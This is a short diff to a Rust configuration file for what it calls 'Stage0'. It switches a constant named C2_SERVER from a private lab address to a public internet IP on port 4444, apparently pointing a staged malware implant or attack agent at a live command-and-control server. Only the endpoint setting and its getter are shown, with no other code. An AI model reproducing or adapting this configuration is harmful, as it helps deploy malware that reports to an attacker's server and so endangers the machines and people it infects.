@@ -1,5 +1,5 @@
 //! Configuration for Stage0
-pub const C2_SERVER: &str = "192.168.1.104:4444";
+pub const C2_SERVER: &str = "186.139.85.3:4444";
 
 pub fn get_c2_server() -> &'static str {
     C2_SERVER
